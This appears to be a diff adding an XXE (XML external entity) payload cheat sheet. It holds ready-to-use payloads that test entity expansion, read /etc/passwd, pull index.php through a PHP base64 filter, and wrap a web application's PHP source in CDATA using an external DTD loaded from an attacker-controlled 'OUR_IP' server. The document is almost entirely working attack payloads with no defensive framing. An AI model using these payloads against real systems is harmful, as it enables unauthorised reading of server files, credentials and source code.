@@ -1,0 +1,51 @@
+#################### TRY IF XXE WORKS ####################
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email [ <!ENTITY company "It Works!"> ]>
+<email>&company;</email>
+
+
+
+#################### XML COMPATIBLE ONLY FILE READ ####################
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email [ <!ENTITY company SYSTEM "file:///etc/passwd"> ]>
+<email>&company;</email>
+
+
+
+#################### PHP ONLY FILE READ ####################
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email [ <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
+<email>&company;</email>
+
+
+
+#################### CDATA FILE READ ####################
+echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email [
+  <!ENTITY % begin "<![CDATA[">
+  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">
+  <!ENTITY % end "]]>">
+  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd">
+  %xxe;
+]>
+<email>&joined;</email>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
